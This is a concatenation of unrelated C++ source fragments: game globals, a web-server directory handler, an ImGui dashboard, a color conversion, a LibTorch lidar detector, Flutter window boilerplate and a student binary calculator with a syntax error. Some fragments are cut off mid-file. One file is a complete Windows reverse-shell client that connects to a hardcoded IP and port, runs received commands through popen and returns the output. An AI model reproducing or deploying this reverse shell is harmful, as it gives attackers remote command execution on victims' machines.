fullscreen_width = -1;\nint fullscreen_height = -1;\nint gameover_count = 0;\nint num_knives = 2;\nint max_num_knives = 2;\nint knife_charge = 2;\nint num_knives_fired = 0;\nint num_enemies_escaped = 0;\nint player_health = 3;\nint player_max_health = 3;\nint player_soulshards = 0;\nint total_soulshards_collected = 0;\nint powerups_onscreen = 0;\n\nentity_id next_entity_id = 0;\nentity_id player_id = -1;\n\nunsigned long game_begin_time = 0;\n\nTTF_Font *gFont = nullptr;\nTTF_Font *stopwatch_font = nullptr;\nTTF_Font *gameover_font = nullptr;\n\nSDL_Color textColor = {255, 255, 255, 255};\nSDL_Color debug_text_color = {255, 255, 255, 255};\nSDL_Color stopwatch_text_color = {255, 0, 0, 255};\nSDL_Event e;\n\nSDL_Rect target_texture_src;\nSDL_Rect target_texture_dest;\nSDL_Rect debug_texture_src;\nSDL_Rect debug_texture_dest;\nSDL_Rect player_hud_texture_src;\nSDL_Rect player_hud_texture_dest;\nSDL_Rect stopwatch_texture_src;\nSDL_Rect stopwatch_texture_dest;\n\nSDL_Window *window = nullptr;\nSDL_Renderer *renderer = nullptr;\nSDL_Joystick *joystick = nullptr;\nSDL_Surface *text_surface = nullptr;\nSDL_Surface *stopwatch_surface = nullptr;\nSDL_Surface *gameover_surface = nullptr;\nSDL_Texture *target_texture = nullptr;\nSDL_Texture *debug_texture = nullptr;\nSDL_Texture *player_hud_texture = nullptr;\nSDL_Texture *stopwatch_texture = nullptr;\nSDL_Texture *gameover_texture = nullptr;\nSDL_Texture *debug_bg_texture = nullptr;\n\nvector<entity_id> entities;\nvector<entity_id> entities_marked_for_deletion_tmp;\nvector<double> bat_vx_vec;\nvector<int> bat_y_vec;\n\nmap<entity_id, sprite_component> sprites;\nmap<entity_id, sprite_component> bg_sprites;\nunordered_map<entity_id, int> hitpoints;\nunordered_map<entity_id, powerup_type> powerup_types;\nunordered_map<entity_id, enemy_type> enemy_types;\nunordered_map<entity_id, transform_component> transforms;\nunordered_map<entity_id, transform_component> bg_transforms;\nunordered_map<entity_id, bg_entity_type> bg_entity_types;\nunordered_map<entity_id, double> rotation_speeds;\nunordered_map<entity_id, generator_component> generators;\nunordered_map<entity_id, entity_type> entity_types;\nunordered_map<entity_id, bool> inputs;\n// unordered_map<entity_id, bool> is_damaged;\nunordered_map<entity_id, bool> is_rotating;\nunordered_map<entity_id, bool> is_collidable;\n// unordered_map<entity_id, bool> is_blood_pixel;\nunordered_map<entity_id, bool> is_enemy;\nunordered_map<entity_id, bool> is_soulshard;\nunordered_map<entity_id, bool> is_knife;\nunordered_map<entity_id, bool> is_powerup;\nunordered_map<entity_id, bool> is_flipped;\nunordered_map<entity_id, bool> is_generator;\nunordered_map<entity_id, bool> is_marked_for_deletion;\nunordered_map<entity_id, int> knife_charges;\nunordered_map<entity_id, int> blood_pixel_lifetime;\nunordered_map<entity_id, int> explosion_frames;\nunordered_map<enemy_type, int> enemies_killed;\nunordered_map<powerup_type, int> powerups_collected;\nunordered_map<string, SDL_Texture *> textures;\nunordered_map<string, int> num_clips;\nunordered_map<int, bool> is_pressed;\n\n// random number generator\ndefault_random_engine rng_generator;\nuniform_real_distribution<double> unit_distribution;\nuniform_real_distribution<double> eyeball_vx_distribution;\nuniform_real_distribution<double> soulshard_spawn_rate_distribution;\nuniform_real_distribution<double> texture_height_distribution;\nuniform_real_distribution<double> blood_velocity_positive_distribution;\nuniform_real_distribution<double> blood_velocity_negative_distribution;\nuniform_real_distribution<double> blood_velocity_dist",
    "/* ************************************************************************* */\n/*      ##       ##      ## ##       ##      ## ##       ##      ##          */\n/*       ##     ####    ##   ##     ####    ##   ##     ####    ##           */\n/*        ##  ##   ##  ##     ##  ##   ##  ##     ##  ##   ##  ##            */\n/*         ####     ####       ####     ####       ####     ####             */\n/*          ##       ##         ##       ##         ##       ##              */\n/*                                                                           */\n/*           WONDERFUL            WEBSERV           WONDERTEAM               */\n/*                                                                           */\n/*      FELICIA KOOLHOVEN      FLEN HUISMAN       MARES VERBRUGGE            */\n/*          fkoolhov             fhuisman             mverbrug               */\n/*                                                                           */\n/*          Codam Coding College        part of 42 network                   */\n/*                            April - May 2024                               */\n/* ************************************************************************* */\n\n#include \"RequestHandler.hpp\"\n#include <dirent.h> //opendir()\n#include <filesystem> //is_directory()\n\nstd::string RequestHandler::constructBodyFromDirectory()\n{\n    std::string body;\n\n    if (!_location.getDirectoryListing())\n    {\n        std::string defaultPage = _location.getDefaultPage();\n        if (defaultPage.empty())\n            throw_error(\"Requested path is a directory\", FORBIDDEN);\n        addHeader(\"Content-Type\", \"text/html\");\n        return (constructBodyFromFile(defaultPage));\n    }\n    DIR* dir_stream = opendir(_absPath.c_str());\n    if (!dir_stream)\n        throw_error(\"Couldn't open directory\", FORBIDDEN);\n    struct dirent *dirent;\n    body = \"<!DOCTYPE html>\\r\\n<html lang=\\\"en\\\">\\r\\n<head>\\r\\n\\t<meta charset=\\\"UTF-8\\\">\\r\\n\\t<meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\">\\r\\n\\t<title>Directory Listing</title>\\r\\n</head>\\r\\n<body>\\r\\n\\t<h1>Directory Listing</h1>\\r\\n\\t<p>The page you requested is a directory with the following content:</p>\\r\\n\\t<ul>\\r\\n\";\n    while ((dirent = readdir(dir_stream)))\n    {\n        if (dirent->d_name[0] != '.')\n            body += \"\\t\\t<li><a href=\\\"\" + _request.getPath() + '/' + dirent->d_name + \"\\\">\" + dirent->d_name + \"</a></li>\\r\\n\";\n    }\n    body += \"\\t</ul>\\r\\n</body>\\r\\n</html>\";\n    closedir(dir_stream);\n    addHeader(\"Content-Type\", \"text/html\");\n    return (body);\n}\n\nstd::string RequestHandler::constructBody()\n{\n    std::string body;\n    \n    if (std::filesystem::is_directory(_absPath))\n        return (constructBodyFromDirectory());\n    body = constructBodyFromFile(_absPath);\n    addHeader(\"Content-Type\", getContentType(_extension));\n    return (body);\n}\n\nvoid RequestHandler::handleGetRequest()\n{\n    std::string extension;\n    std::string path;\n\n    path = _request.getPath();\n\n    if (path.find_last_of('.') != std::string::npos)\n        extension = path.substr(path.find_last_of('.'));\n    if (extension.size() != 0 && extension == _location.getCgiExtension())\n    {\n        _CGI = true;\n        return ;\n    }\n    setBody(constructBody());\n    if (_body.size() != 0)\n        addHeader(\"Content-Length\", std::to_string(_body.size()));\n\n}",
    "#include \"imgui.h\"\n#include \"imgui_impl_sdl2.h\"\n#include \"imgui_impl_opengl2.h\"\n#include \"implot.h\"\n#include <cstdio>\n#include <SDL.h>\n#include <SDL_opengl.h>\n#include <array>\n#include <iostream>\n#include <vector>\n#include <chrono>\n\n\n// Main code\nint main(int, char**)\n{\n    // Setup SDL\n    if (SDL_Init(SDL_INIT_VIDEO | SDL_INIT_TIMER | SDL_INIT_GAMECONTROLLER) != 0)\n    {\n        printf(\"Error: %s\\n\", SDL_GetError());\n        return -1;\n    }\n\n    // From 2.0.18: Enable native IME.\n#ifdef SDL_HINT_IME_SHOW_UI\n    SDL_SetHint(SDL_HINT_IME_SHOW_UI, \"1\");\n#endif\n\n    // Setup window\n    SDL_GL_SetAttribute(SDL_GL_DOUBLEBUFFER, 1);\n    SDL_GL_SetAttribute(SDL_GL_DEPTH_SIZE, 24);\n    SDL_GL_SetAttribute(SDL_GL_STENCIL_SIZE, 8);\n    SDL_GL_SetAttribute(SDL_GL_CONTEXT_MAJOR_VERSION, 2);\n    SDL_GL_SetAttribute(SDL_GL_CONTEXT_MINOR_VERSION, 2);\n    auto window_flags = (SDL_WindowFlags)(SDL_WINDOW_OPENGL | SDL_WINDOW_RESIZABLE | SDL_WINDOW_ALLOW_HIGHDPI);\n    SDL_Window* window = SDL_CreateWindow(\"Monitoring for Gas FLow control system\", SDL_WINDOWPOS_CENTERED, SDL_WINDOWPOS_CENTERED, 1280, 720, window_flags);\n    if (window == nullptr)\n    {\n        printf(\"Error: SDL_CreateWindow(): %s\\n\", SDL_GetError());\n        return -1;\n    }\n\n    SDL_GLContext gl_context = SDL_GL_CreateContext(window);\n    SDL_GL_MakeCurrent(window, gl_context);\n    SDL_GL_SetSwapInterval(1); // Enable vsync\n\n    // Setup Dear ImGui context\n    IMGUI_CHECKVERSION();\n    ImGui::CreateContext();\n    ImPlot::CreateContext();\n    ImGuiIO& io = ImGui::GetIO(); (void)io;\n    io.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard;     // Enable Keyboard Controls\n    io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad;      // Enable Gamepad Controls\n    io.ConfigFlags |= ImGuiConfigFlags_DockingEnable;         // Enable Docking\n    io.ConfigFlags |= ImGuiConfigFlags_ViewportsEnable;       // Enable Multi-Viewport / Platform Windows\n    io.BackendFlags |= ImGuiBackendFlags_RendererHasVtxOffset;\n\n\n\n    // Setup Dear ImGui style\n    ImGui::StyleColorsDark();\n    //ImGui::StyleColorsLight();\n\n    // When viewports are enabled we tweak WindowRounding/WindowBg so platform windows can look identical to regular ones.\n    ImGuiStyle& style = ImGui::GetStyle();\n    if (io.ConfigFlags & ImGuiConfigFlags_ViewportsEnable)\n    {\n        style.WindowRounding = 0.0f;\n        style.Colors[ImGuiCol_WindowBg].w = 1.0f;\n    }\n\n    // Setup Platform/Renderer backends\n    ImGui_ImplSDL2_InitForOpenGL(window, gl_context);\n    ImGui_ImplOpenGL2_Init();\n\n    //IM_ASSERT(font != nullptr);\n    io.Fonts->AddFontFromFileTTF(\"/home/tehnokrat/Downloads/BruceForeverRegular-X3jd2.ttf\", 15.0f);\n\n    bool show_demo_window = false;\n    bool show_another_window = false;\n    bool show_plot_window = true;\n\n    std::string connection_button_label = \"Connect\";\n\n    std::vector<std::string> logs = {\n            \"Application opened successfully\",\n            \"Logging started...\",\n    };\n\n    std::vector<std::string> logs_data = {};\n    std::vector<std::string> logs_time = {};\n\n    ImVec4 clear_color = ImVec4(0.45f, 0.55f, 0.60f, 1.00f);\n\n    // Main loop\n    bool done = false;\n    bool connection_emitted = false;\n    int window_height, window_width, window_position_x, window_position_y;\n\n    std::vector<double> times; // This will store the time values\n    std::vector<double> framerates; // This will store the framerate values\n\n    auto start = std::chrono::system_clock::now();\n\n    while (!done){\n        SDL_Event event;\n        while (SDL_PollEvent(&event))\n        {\n            ImGui_ImplSDL2_ProcessEvent(&event);\n            if (event.type == SDL_QUIT)\n                done = true;\n            if (event.type == SDL_WINDOWEVENT && event.window.event == SDL_WINDOWEVENT_CLOSE && event.window.windowID == SDL_GetWindowID(window))\n                done = true;\n        }\n        // Start the Dear ImGui frame\n        ImGui_ImplOpenGL2_NewFrame();\n        ImGui_ImplSDL2_NewFrame();\n        ImGui::NewFrame();\n\n        auto now = std::chrono::system_clock::now();  // Calculate the time elapsed since the start of the application in seconds\n        auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(now - start);\n        auto current_time = elapsed.count();\n\n\n        double current_framerate = io.Framerate;\n\n        SDL_GetWindowSize(window, &window_width, &window_height);\n        SDL_GetWindowPosition(window, &window_position_x, &window_position_y);\n\n\n        ImGui::SetNextWindowSize(ImVec2(window_width * 1 / 3, window_height)); // Set \"New Window\" size to 1/3 of SDL window width and full height\n        ImGui::SetNextWindowPos(ImVec2(window_position_x, window_position_y)); // Set \"New Window\" position to top left corner\n\n        if (ImGui::Begin(\"Control panel\")) // begin window\n        {\n            if (ImGui::Button(connection_button_label.c_str())) // Buttons return true when clicked.\n            {\n                connection_button_label = (connection_button_label == \"Connect\") ? \"",
    "// Build using the command => g++ client.cpp -o client.exe -lws2_32 -static-libstdc++ -static-libgcc -static\n// Build using the command => g++ client.cpp -o client.exe -lws2_32 -static-libgcc\n// Linker attributes -lws2_32 -static-libstdc++ -static-libgcc -static\n\n#include <iostream>\n#include <winsock2.h>\n#include <ws2tcpip.h>\n#include <string.h>\n#include <unistd.h>\n\nusing namespace std;\n\n#define BUFFER_SIZE 2048\n#define PORT 55555\n#define IP_ADDR \"10.10.15.177\"\n\nstring exec(string command) {\n   char buffer[BUFFER_SIZE];\n   string result = \"\";\n\n   // Open pipe to file\n   FILE* pipe = popen(command.c_str(), \"r\");\n   if (!pipe) {\n      return \"popen failed!\";\n   }\n\n   // read till end of process:\n   while (!feof(pipe)) {\n\n      // use buffer to read and add to result\n      if (fgets(buffer, BUFFER_SIZE, pipe) != NULL)\n         result += buffer;\n   }\n\n   pclose(pipe);\n   return result;\n}\n\nint main(int argc, char const *argv[]){\n    SOCKET clientSocket;\n    WSADATA wsaData;\n    \n    if(WSAStartup(MAKEWORD(2,2),&wsaData) != 0){\n        cout<< \" Failed at WSAStartup !\" <<endl;\n        return -1;\n    }\n    cout<< \"[*] WSAStartup successful \"<<endl;\n\n    clientSocket = INVALID_SOCKET;\n    clientSocket = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);\n\n    if(clientSocket == INVALID_SOCKET){\n        cout << \"Error at socket()\"<<endl;\n        WSACleanup();\n        return -1;\n    }\n    cout<< \"[*] Socket successful \"<<endl;\n\n    sockaddr_in service;\n    service.sin_family = AF_INET;\n    service.sin_addr.s_addr = inet_addr(IP_ADDR);\n    service.sin_port = htons(PORT);\n    memset(&(service.sin_zero),0,8);\n    \n    if(connect(clientSocket,(SOCKADDR *)&service,sizeof(service)) == SOCKET_ERROR){\n        cout << \"Error at connect()\"<<endl;\n        WSACleanup();\n        return -1;\n    }\n    cout<< \"[*] Connect successful \"<<endl;\n\n    int response;\n    \n    char receivedData[BUFFER_SIZE];\n    char sendData[BUFFER_SIZE];\n\n    strcpy(receivedData,\"\\0\");\n    getcwd(sendData,BUFFER_SIZE);\n\n    while (true)\n    {   \n        response = send(clientSocket,sendData,BUFFER_SIZE,0);\n        response = recv(clientSocket,receivedData,BUFFER_SIZE,0);\n        string command(receivedData);\n\n        if(strcmp(command.substr(0,2).c_str(),\"cd\") == 0){\n            if (command.size() == 2) getcwd(sendData,BUFFER_SIZE);\n            if (command.size() > 2){\n                chdir(command.substr(3).c_str());\n                getcwd(sendData,BUFFER_SIZE);\n            }\n            continue;\n        }\n        if(strcmp(command.c_str(),\"exit\") == 0){\n            return -1;\n        }\n        string result = exec(command);\n        strcpy(sendData,result.c_str());\n    }\n    \n    WSACleanup();\n    return 0;\n}\n",
    "#include \"iostream\"\n#include \"cmath\"\n#define PI 3.1415926535\nusing namespace std;\nint main()\n{\n    double R,G,B,I,H,S;\n    R = 255;\n    G = 0;\n    B = 1;\n\n    double theta = acos((0.5 * ((R - G) + (R - B))) / (sqrt((R - G) * (R - G) + (R - B) * (G - B)) + (1 / DBL_MAX))) /  PI * 180;\n    cout << \"cos\" << cos(180 / 180 * PI) << endl;\n    cout << \"theta:\" << theta << endl;\n    I = (R + G + B) / 3;\n    if (R + G + B == 0) S = 1;\n    else S = 1 - (3 / (R + G + B)) * (R > G ? (G > B ? B : G) : (R > B ? B : R));\n\n    H = (B <= G ? theta : 360 - theta);\n\n\n    I *= 1;\n    H *= 0.5;\n    S *= 1;\n\n    if (I > 255) I = 255;\n    if (H > 360) H = 360;\n    if (S > 1) S = 1;\n\n    cout <<\"I \"<<I<<endl;\n    cout <<\"H \"<<H<<endl;\n    cout <<\"S \"<<S<<endl;\n\n    if (H >= 0 && H < 120)\n    {\n        R = I * (1 + S * cos(H / 180 * PI) / cos((60 - H) / 180 * PI));\n        B = I * (1 - S);\n        G = 3 * I - (R + B);\n    } else if (H >= 120 && H < 240)\n    {\n        R = I * (1 - S);\n        G = I * (1 + S * cos((H - 120) / 180 * PI) / cos((180 - H) / 180 * PI));\n        B = 3 * I - (R + G);\n    } else if (H >= 240 && H <= 360)\n    {\n        G = I * (1 - S);\n        B = I * (1 + S * cos((H - 240) / 180 * PI) / cos((300 - H) / 180 * PI));\n        R = 3 * I - (G + B);\n    }\n\n    cout <<\"R \"<<R<<endl;\n    cout <<\"G \"<<G<<endl;\n    cout <<\"B \"<<B<<endl;\n}",
    "#include \"torch/torch.h\"\n#include \"torch/script.h\"\n#include \"Detector.h\"\n#include <chrono>\n//#include<Python.h>\n\n\nstruct LaserScan {\n    std::string timestamp;\n    std::string Lar;\n    std::string d;\n    std::string laser_num;\n    std::string raw_laser_scan; //\u5b8c\u6574\u7684laserscna\u6570\u636e\n    std::vector<float> laser_scan_angle;\n    std::vector<float> laser_scan_dis;\n};\n\nLaserScan parseLaserScan(std::string data)\n{\n    int index = 0;\n    LaserScan laserscan;\n    int start_pos = data.find(\"[\");\n\n    while (start_pos != std::string::npos)\n    {\n        int end_pos = data.find(\"]\", start_pos);\n        std::string data_inside_brackets = data.substr(start_pos + 1, end_pos - start_pos - 1);\n        if (index == 0)\n        {\n            laserscan.timestamp = data.substr(start_pos + 1, end_pos - start_pos - 1);\n        }\n        else if (index == 4)\n        {\n            laserscan.raw_laser_scan = data.substr(start_pos + 1, end_pos - start_pos - 1);\n        }\n        start_pos = data.find(\"[\", end_pos);\n        index += 1;\n    }    \n    // \n    index = 0;\n    std::istringstream iss(laserscan.raw_laser_scan);\n    while (std::getline(iss, data, '|')) {\n        if (index - 3 > 0 && ~index & 1)\n            //laserscan.laser_scan_angle.push_back(stof(data));\n            laserscan.laser_scan_angle.push_back(stof(data) * M_PI / 180.0);\n        else if (index - 3 > 0 && index & 1)\n            laserscan.laser_scan_dis.push_back(stof(data));\n        index += 1;\n    }\n    return laserscan;\n}\nint main()\n{\n    std::string mode = \"cpu\";\n    c10::Device device = (mode == \"cuda\") ? c10::kCUDA : c10::kCPU;\n\n\n    std::string data = \"[240314 165837.922][Lar][d] [Laser: 1][28376814886526|-90|90|0.9|-90|7.623|-89.1|7.621|-88.2|7.623|-87.3|7.629|-86.4|7.628|-85.5|7.634|-84.6|7.613|-83.7|7.067|-82.8|7.077|-81.9|7.091|-81|7.107|-80.1|7.129|-79.2|7.152|-78.3|7.171|-77.4|7.194|-76.5|7.222|-75.6|7.245|-74.7|7.27|-73.8|7.308|-72.9|7.345|-72|7.378|-71.1|7.405|-70.2|7.445|-69.3|7.471|-68.4|7.526|-67.5|7.564|-66.6|7.61|-65.7|7.663|-64.8|7.716|-63.9|7.771|-63|7.837|-62.1|7.906|-61.2|7.97|-60.3|8.041|-59.4|8.107|-58.5|8.177|-57.6|8.267|-56.7|8.35|-55.8|8.435|-54.9|8.536|-54|8.619|-53.1|8.722|-52.2|8.818|-51.3|8.916|-50.4|0|-49.5|7.517|-48.6|0|-47.7|9.403|-46.8|0|-45.9|9.7|-45|9.813|-44.1|1.457|-43.2|1.432|-42.3|1.412|-41.4|1.391|-40.5|1.371|-39.6|1.352|-38.7|1.337|-37.8|1.315|-36.9|1.305|-36|1.285|-35.1|1.269|-34.2|1.258|-33.3|1.246|-32.4|1.225|-31.5|1.216|-30.6|1.204|-29.7|1.191|-28.8|1.182|-27.9|0|-27|0.893|-26.1|0.891|-25.2|0.882|-24.3|0.876|-23.4|0.87|-22.5|0.865|-21.6|0.852|-20.7|0.858|-19.8|0.845|-18.9|0.838|-18|0.837|-17.1|0.825|-16.2|0.824|-15.3|0.824|-14.4|0.822|-13.5|0.825|-12.6|0.825|-11.7|0.819|-10.8|0.818|-9.9|0.808|-9|0.807|-8.1|0.813|-7.2|0.811|-6.3|0.804|-5.4|0.803|-4.5|0.809|-3.6|0.8|-2.7|0.801|-1.8|0.801|-0.9|0.792|0|0.796|0.9|0.804|1.8|0.803|2.7|0.8|3.6|0.801|4.5|0.809|5.4|0.815|6.3|0.816|7.2|0.815|8.1|0.81|9|0.815|9.9|0.815|10.8|0.825|11.7|0.823|12.6|0.818|13.5|0.825|14.4|0.826|15.3|0.826|16.2|0.829|17.1|0.838|18|0.844|18.9|0.854|19.8|0.862|20.7|0.867|21.6|0.869|22.5|0.878|23.4|0.877|24.3|0.889|25.2|0.899|26.1|0.9|27|0|27.9|6.726|28.8|6.878|29.7|7.061|30.6|6.907|31.5|6.975|32.4|7.05|33.3|7.331|34.2|7.287|35.1|7.291|36|7.366|36.9|7.434|37.8|7.519|38.7|11.187|39.6|11.068|40.5|10.859|41.4|10.643|42.3|10.455|43.2|10.289|44.1|10.127|45|9.965|45.9|9.813|46.8|9.67|47.7|9.537|48.6|9.4|49.5|9.272|50.4|9.15|51.3|9.04|52.2|8.93|53.1|8.822|54|8.723|54.9|8.63|55.8|0|56.7|0|57.6|8.364|58.5|8.284|59.4|8.206|60.3|8.142|61.2|6.222|62.1|7.998|63|7.939|63.9|7.873|64.8|7.809|65.7|7.765|66.6|7.725|67.5|0|68.4|0|69.3|7.585|70.2|7.536|71.1|0|72|0|72.9|7.07|73.8|7.036|74.7|7.022|75.6|7|76.5|6.975|77.4|6.973|78.3|6.938|79.2|6.921|80.1|6.925|81|6.894|81.9|6.875|82.8|6.868|83.7|6.857|84.6|6.843|85.5|6.823|86.4|6.828|87.3|6.817|88.2|6.81|89.1|6.819|90|6.816]\";\n    LaserScan laserscan = parseLaserScan(data);\n\n    torch::Tensor scans = torch::tensor(laserscan.laser_scan_dis, device);\n    torch::Tensor scan_phi = torch::tensor(laserscan.laser_scan_angle, device);\n\n    Detector* dr = new Detector();\n\n    //\u6570\u636e\u9884\u5904\u7406\n    auto ct = dr->scans_to_cutout_torch(scans, scan_phi);\n    ct = ct.unsqueeze(0); // \u589e\u52a0\u7ef4\u5ea6\n    std::vector<torch::jit::IValue> x;\n    x.push_back(ct);\n\n    //\u6a21\u578b\u63a8\u7406\n    torch::jit::script::Module module = torch::jit::load(\"C:\\\\Projects\\\\Python\\\\2D_lidar_person_detection\\\\cpu.pt\", device);\n    auto val = module.forward(x);\n    torch::Tensor pred_cls = val.toTuple()->elements()[0].toTensor();\n    torch::Tensor pred_reg = val.toTuple()->elements()[1].toTensor();\n    pred_cls = torch::sigmoid(pred_cls.index({ 0 }));\n    pred_reg = pred_reg.index({ 0 });\n\n    //\u540e\u5904\u7406\n    torch::Tensor dets_xys, dets_cls;\n    dr->nms_predicted_center(scans, scan_phi, pred_cls, pred_reg, dets_xys, dets_cls);\n\n    // \u8fd4\u56de\u503c\u9700\u8981\u5750\u6807\uff0c\u671d\u5411\u89d2\u5ea6\n  \n}",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include<iostream>\nusing namespace std;\n\nvoid add();\nvoid subt();\nvoid mul();\nvoid div();\nvoid ConvertAnother();\n\nint main() {\n\n    int choice;\n\n    cout<<\" \\t\\t      WELCOME_TO_BINARY_CALCULATOR!     \\n\";\n    cout<<\"\\t\\t         By GROUP-1 \\n\";\n    cour<<\"\\t\\t Created By: Edcor Zacal\n    cout<<endl;\n    cout<<\"PLEASE SELECT AN OPERATOR:   \\n[1.]ADDITION. \\n[2.]SUBTRACTION. \\n[3.]MULTIPLICATION \\n[4.]DIVISION.\";\n    cout<<endl<<\">>\";\n    cin>>choice;\n\n    if(choice==1) {\n        cout<<endl;\n        system(\"cls\");\n        add();\n    }\n    else if(choice==2) {\n        cout<<endl;\n        system(\"cls\");\n        subt();\n    }\n    else if(choice==3) {\n        cout<<endl;\n        system(\"cls\");\n        mul();\n    }\n    else if (choice==4) {\n        cout<<endl;\n        system(\"cls\");\n        div();\n    }\n    else {\n        cout<<endl;\n        cout<<\"INVALID_INPUT \\n\";\n        cout<<\"PLEASE TRY AGAIN!\";\n\n    }\n    //system(\"pause\");\n    return 0;\n}\n\nvoid add()\n{\n    int bin2, bin1, dec1=0, dec2=0, i1=1, i2=1, rem1, rem2, inspct=0, result=0;\n\n    cout<<\" Enter the First Binary Number: \";\n    cin>>bin1;\n    cout<<\" Enter the Second Binary Number: \";\n    cin>>bin2;\n\n    while(bin1!=0 || bin2!=0)\n    {\n        rem1 = bin1%10;\n        rem2 = bin2%10;\n        if(rem1>1 && rem2>1)\n        {   inspct++;\n            break;\n        }\n        dec1 = dec1 + (rem1*i1);\n        dec2 = dec2 + (rem2*i2);\n        i1 = i1*2;\n        i2 = i2*2;\n        bin1 = bin1/10;\n        bin2 = bin2/10;\n    }\n    if(inspct==0)\n    {\n\n\n        result=dec1+dec2;\n        cout<<\"Decimal Values: \";\n        cout<<dec1<<\" * \"<<dec2<<\" = \"<<result;\n        int DeciNum, BinNum[20], i=0;\n        DeciNum = result;\n        while(DeciNum!=0)\n        {\n            BinNum[i] = DeciNum%2;\n            i++;\n            DeciNum = DeciNum/2;\n\n        }\n        cout<<\"\\nEquivalent Binary Result: \";\n        for(i=(i-1); i>=0; i--)\n            cout<<BinNum[i];\n        cout<<endl;\n\n    } else\n        system(\"cls\");\n    cout<<\"Invalid\";\n\n    ConvertAnother();\n    cout<<endl;\n\n}\nvoid subt()\n{\n    int bin1, bin2, dec1=0, dec2=0, i1=1, i2=1, inspct=0, rem1, rem2, result=0;\n    cout<<\"Enter First Binary Number: \";\n    cin>>bin1;\n    cout<<\"Enter Second Binary Number: \";\n    cin>>bin2;\n    while(bin1!=0 && bin1!=0)\n    {\n        rem1 = bin1%10;\n        rem2 = bin2%10;\n        if(rem1>1&&rem2>1)\n        {   inspct++;\n            break;\n        